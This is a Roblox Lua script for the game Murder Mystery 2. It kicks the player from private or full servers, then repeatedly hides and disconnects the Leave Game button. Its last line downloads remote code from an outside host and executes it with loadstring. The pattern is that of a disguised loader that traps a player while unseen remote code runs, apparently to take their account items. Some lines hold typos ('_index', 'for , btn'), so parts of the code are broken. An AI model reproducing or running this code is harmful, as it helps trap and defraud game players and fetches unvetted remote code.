local Services = setmetatable({}, {
    _index = function(self, s)
        return game:GetService(s)
    end
})

if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick("Script: Only works in Murder Mystery 2")
    return
end

local IsVipServer = false
pcall(function()
    local rs = Services.RobloxReplicatedStorage
    if rs and rs:FindFirstChild("GetServerType") then
        IsVipServer = (rs.GetServerType:InvokeServer() == "VIPServer")
    end
end)
if IsVipServer then
    game.Players.LocalPlayer:Kick("Script: Private servers not supported — join a normal server")
    return
end

if #game.Players:GetPlayers() >= 12 then
    game.Players.LocalPlayer:Kick("Script: Server is full — join another server")
    return
end

task.spawn(function()
    while task.wait(0.3) do
        pcall(function()
            local CoreGui = Services.CoreGui
            if not CoreGui then return end
            for , btn in ipairs(CoreGui:GetDescendants()) do
                if btn:IsA("GuiButton") and btn.Name == "LeaveGameButton" then
                    btn.Visible = false
                    if getconnections then
                        for _, conn in ipairs(getconnections(btn.Activated)) do
                            conn:Disable()
                        end
                    end
                    if btn.Activated.DisconnectAll then
                        btn.Activated:DisconnectAll()
                    end
                end
            end
        end)
    end
end)

loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6ImEyNmYwNjE0LWUwOWItNDAxYS05Yzg4LWQzZGRmYjEwMmIwYyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJ1bml2ZXJzYWwifX0"))()
